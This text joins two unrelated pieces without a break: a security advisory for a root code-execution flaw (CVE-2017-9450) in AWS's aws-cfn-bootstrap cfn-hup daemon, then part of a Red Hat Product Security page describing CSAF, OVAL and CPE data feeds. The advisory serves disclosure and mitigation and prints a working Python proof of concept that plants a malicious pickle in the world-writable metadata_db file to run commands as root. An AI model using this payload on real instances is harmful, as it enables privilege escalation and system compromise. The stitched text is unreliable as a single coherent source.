aws-cfn-bootstrap local code execution as root
==============================================
The latest version of this advisory is available at:
https://sintonen.fi/advisories/aws-cfn-bootstrap-local-code-execution-as-root.txt
Overview
--------
AWS EC2 instances deployed with the AWS CloudFormation bootstrap contain a vulnerable
daemon that enables an attacker to execute arbitrary code as root.
Description
-----------
The aws-cfn-bootstrap `cfn-hup` daemon contains a local code execution vulnerability.
A non-privileged attacker with the capability to write files (either locally or
remotely) can write a specially crafted file which will result in arbitrary code
execution as root.
Impact
------
The non-privileged attacker is able to execute arbitrary commands as the administrative
user (root). This leads to complete loss of confidentiality, integrity and availability.
Details
-------
The discovered vulnerability, described in more detail below, enables multiple
independent attacks described here in brief:
Local Arbitrary Code Execution As Root
--------------------------------------
A local user can overwrite or replace a file with a specially crafted contents
that results in a code execution as root.
The code execution is limited to local users, unless a remotely accessible
service contains an arbitrary file write vulnerability in which case the combined
result is a remote code execution as root.
Information Leak
----------------
A local user can read the metadata\_db file. This file typically contains cleartext
passwords and other similar confidential information.
The confidential data is exposed to local users, but if a remotely accessible service
contains an arbitrary file read vulnerability in which case the information is obviously
exposed to external attackers as well.
[CVE-2017-9450] Incorrect Permission Assignment for Critical Resource (CWE-732)
-------------------------------------------------------------------------------
The `cfn-hup` daemon of the `aws-cfn-bootstrap` package is running with umask 0. This
happens because /opt/aws/bin/cfn-hup does not set a secure umask for the `DaemonContext`
class of the `python-daemon` package:
with daemon.DaemonContext(pidfile=pidlockfile.TimeoutPIDLockFile('/var/run/cfn-hup.pid', 300),
signal\_map={signal.SIGTERM : kill}):
The `python-daemon` package defaults to a umask of 0 as seen in
https://pagure.io/python-daemon/blob/master/f/daemon/daemon.py :
`umask`
:Default: ``0``
File access creation mask ("umask") to set for the process on
daemon start.
A daemon should not rely on the parent process's umask value,
which is beyond its control and may prevent creating a file with
the required access mode. So when the daemon context opens, the
umask is set to an explicit known value.
If the conventional value of 0 is too open, consider setting a
value such as 0o022, 0o027, 0o077, or another specific value.
Otherwise, ensure the daemon creates every file with an
explicit access mode for the purpose.
Any file or directory created by the daemon will thus use the mask as specified
by the `mkdir` or `open` functions.
The code in /usr/lib/python2.7/dist-packages/cfnbootstrap/update\_hooks.py does the
following:
def \_create\_storage\_dir(self):
if os.name == 'nt':
self.storage\_dir = os.path.expandvars(r'${SystemDrive}\cfn\cfn-hup\data')
else:
self.storage\_dir = '/var/lib/cfn-hup/data'
if not os.path.isdir(self.storage\_dir):
log.debug("Creating %s", self.storage\_dir)
try:
os.makedirs(self.storage\_dir)
Since `os.makedirs` defaults to mode 777 the resulting directories /var/lib/cfn-hup and
/var/lib/cfn-hup/data will have permissions 777 (`rwxrwxrwx`), that is, the directories
are world-writable.
The CFN hook processing code reads the file `metadata\_db` with the Python `shelve`
module:
def process(self):
with contextlib.closing(shelve.open('%s/metadata\_db' % self.dir)) as shelf:
self.\_resource\_cache = {}
for hook in self.hooks:
try:
self.\_process\_hook(hook, shelf)
And:
def \_process\_hook(self, hook, shelf):
try:
new\_data = self.\_retrieve\_path\_data(hook.path)
except InFlightStatusError:
return
old\_data = shelf.get(hook.name + "|" + hook.path, None)
The `shelve` module comes with a fat warning about possible arbitrary code execution:
> Warning: Because the shelve module is backed by pickle, it is insecure to load a
shelf from an untrusted source. Like with pickle, loading a shelf can execute
arbitrary code.
Since any user can write to the /var/lib/cfn-hup/data/metadata\_db file and the
`cfn-hup` daemon is running as root, any user can execute arbitrary commands as
root.
A proof of concept exploit:
#!/usr/bin/env python
import os
import shelve
class E(object):
def \_\_reduce\_\_(self):
return (os.system, ('id >/pwned',))
s = shelve.open('/var/lib/cfn-hup/data/metadata\_db')
for k in s.keys():
s[k] = E()
s.close()
The vulnerable code is executed every 15 minutes. So by average it takes 450
seconds for the exploit to get triggered. The exploit is also executed when
the daemon is started (for example at system boot).
Reproducing
-----------
1. Sign in to AWS.
2. From AWS Console "Management Tools" select "CloudFormation".
3. Select "Create Stack".
4. Select eg. the template "LAMP Stack".
5. Fill the relevant fields. Note to select the EC2 keypair to use for access.
6. Leave other options as-is.
7. Click "Create".
8. Once running, ssh to the box with the EC2 keypair as `ec2-user`.
9. Upload the PoC to the host and execute it.
10. Wait at most 15 minutes for the /pwned file to appear.
Vulnerable instances
--------------------
Any AWS EC2 instances that has been deployed with a CloudFormation template that
has the aws-cfn-bootstrap package 1.4-15.9.amzn1 and at least one hook included
(for example `cfn-auto-reloader-hook`). This includes, but is not limited to, the AWS
CloudFormation default LAMP, Rails and WordPress templates.
Hooks with the `on.command` trigger don't result in code execution. Some earlier
versions of aws-cfn-bootstrap might have also had such vulnerability for
`on.command` triggers, as well.
The history of this vulnerability and affected package versions are unclear, but the
vulnerability is believed to have existed at least since 2011. As such the number of
vulnerable systems could be high.
Recommendations to vendor
-------------------------
1. In aws-cfn-bootstrap `cfn-hup` command set the `DaemonContext` umask to 077.
2. For existing installations, run `chmod -R go-rwx /var/lib/cfn-hup` as root.
End user mitigation
-------------------
1. Upgrade aws-cfn-bootstrap to 1.4-22.14.amzn1 or or later
2. chmod -R go-rwx /var/lib/cfn-hup

# Security Data

Red Hat Product Security is committed to providing tools and security data to help security measurement. A part of this commitment is our active participation in various projects such as the CVE Project, the OASIS CSAF technical committee, or SBOM/VEX forums. We provide the raw data below so customers and researchers can produce their own metrics, for their own unique situations, and hold us accountable. To receive notifications when we fix bugs and add new features, please follow the official [Red Hat Security Data Changelog](https://access.redhat.com/articles/5554431).

The data resources linked on this page as well as their alternative representations available through the [Security Data API](https://access.redhat.com/documentation/en-us/red_hat_security_data_api/1.0/html/red_hat_security_data_api/index) are licensed under the [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/). If you distribute this content or a modified version of it, you must provide attribution to Red Hat, Inc. and provide a link to the original.

**Note:** Security data (CSAF, OVAL, SBOM, and other files) published by Red Hat Product Security was previously served from two locations:

* https://access.redhat.com/security/data/\*
* https://www.redhat.com/security/data/\*

A new domain was recently created the scope of which (for the time being) is to serve this same data:

* https://security.access.redhat.com/data/\*

Effective Sep 3, 2024, a redirect was put in place for all traffic from *www.redhat.com/security/data/\** to be redirected to the new *security.access.redhat.com/data/\** domain. On Sep 30, a similar change was made for *access.redhat.com/security/data/\** to redirect to *security.access.redhat.com/data/*. No change to the actual files or directory layout under the *data/\** path was made. You can start consuming from the new domain today. For example: <https://access.redhat.com/security/data/csaf/v2/vex/2024/cve-2024-0151.json> is now available at <https://security.access.redhat.com/data/csaf/v2/vex/2024/cve-2024-0151.json>; on Sep 30, the former began redirecting to the latter.

### CSAF/VEX Documents

The Common Security Advisory Framework (CSAF) standard enables organizations to share information about security issues using a consistent and common format. We provide Red Hat security advisories in CSAF format using the VEX profile as well as per-CVE VEX documents that contains information on both fixed and unfixed products/components.

The CSAF advisory data for RPMs is convertered to OSV records and shared with OSV.dev. It is expected that customers will consume this data from OSV.dev not directly from this URL. This is the location OSV.dev consumes the data from.

### OVAL Definitions

**Note: OVAL/DS v1 files are no longer available and have been archived; see [OVAL v1 deprecation announcement](https://access.redhat.com/OVAL_v1_deprecation_announcement) for more information.**

OVAL definitions are available for vulnerabilities that were addressed in errata for Red Hat Enterprise Linux and select additional products. To completely evaluate your system you will need to evaluate it against the streams for all products installed on that system.

### Vulnerability Metadata

#### Repository to CPE Mapping

Used for matching [OVAL security data to installed RPMs](https://www.redhat.com/en/blog/how-accurately-match-oval-security-data-installed-rpms). Each repository also includes a set of relative URLs from where the content of the repository can be downloaded.

* [repository-to-cpe.json](https://security.access.redhat.com/data/meta/v1/repository-to-cpe.json)

#### RHSA RSS feed

An RSS feed that contains a list of Red Hat security advisories released in the last three days.

* [rhsa.rss](https://security.access.redhat.com/data/meta/v1/rhsa.rss)

#### CPE Dictionary

CPE is a structured naming scheme for information technology systems, software, and packages. For reference, we provide a dictionary mapping the CPE names we use, to Red Hat product descriptions. Some of these CPE names will be for new products that are not in the official CPE dictionary, and should therefore be treated as temporary CPE names:

* [cpe-dictionary.xml](https://security.access.redhat.com/data/meta/v1/cpe-dictionary.xml)

### Security Data Archive

Security data files that have been retired are available in an archive. Each file is marked with a date (YYYYMMDD) when it was last updated:
